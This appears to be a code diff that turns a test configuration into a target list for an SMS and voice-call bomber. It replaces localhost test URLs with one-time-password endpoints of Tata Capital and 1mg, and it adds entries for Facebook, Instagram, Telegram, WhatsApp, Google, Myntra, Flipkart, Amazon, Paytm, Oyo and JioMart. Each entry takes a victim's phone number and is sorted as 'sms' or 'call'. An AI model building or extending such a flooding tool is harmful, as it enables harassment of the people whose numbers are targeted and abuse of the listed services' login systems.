@@ -1,7 +1,52 @@
 const APIS = [
   {
+        "name": "Facebook SMS",
+        "url": "https://www.facebook.com/api/graphql/",
+        "method": "POST",
+        "category": "sms",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "phone={phone}&action=send_otp",
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "Instagram SMS",
+        "url": "https://www.instagram.com/api/v1/accounts/send_otp/",
+        "method": "POST",
+        "category": "sms",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "phone_number={phone}",
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "Telegram SMS",
+        "url": "https://my.telegram.org/auth/send_password",
+        "method": "POST",
+        "category": "sms",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "phone={phone}",
+        "success_codes": [200, 201, 202]
+    },
+{
+        "name": "WhatsApp SMS",
+        "url": "https://api.whatsapp.com/send_otp",
+        "method": "POST",
+        "category": "sms",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "Google SMS",
+        "url": "https://accounts.google.com/_/signin/challenge",
+        "method": "POST",
+        "category": "sms",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "phoneNumber={phone}",
+        "success_codes": [200, 201, 202]
+    },
+  {
     name: "Tata",
-    url: "http://localhost:6081/test/otp/a",
+    url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
     method: "POST",
     headers: {
       "Content-Type": "application/json",
@@ -13,8 +58,8 @@ const APIS = [
     success_codes: [200, 201, 202],
   },
   {
-    name: "1",
-    url: "http://localhost:6081/test/otp/a",
+    name: "1mg",
+    url: "https://www.1mg.com/auth_api/v6/create_token",
     method: "POST",
     headers: {
       "Content-Type": "application/json; charset=utf-8",
@@ -25,6 +70,61 @@ const APIS = [
     },
     success_codes: [200, 201, 202],
   },
+  {
+        "name": "Myntra Voice Call",
+        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"mobile": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
+{
+        "name": "Flipkart Voice Call",
+        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"mobile": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
+{
+        "name": "Amazon Voice Call",
+        "url": "https://www.amazon.in/ap/signin",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "phone={phone}&action=voice_otp",
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "Paytm Voice Call",
+        "url": "https://accounts.paytm.com/signin/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "Oyo Voice Call",
+        "url": "https://www.oyorooms.com/api/product/v1/staticpage/sendCallOTP",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "JioMart Voice Call",
+        "url": "https://www.jiomart.com/api/auth/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"mobile": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
+  
 ] as const;
 
 function normalizePhone(phone: string): string {
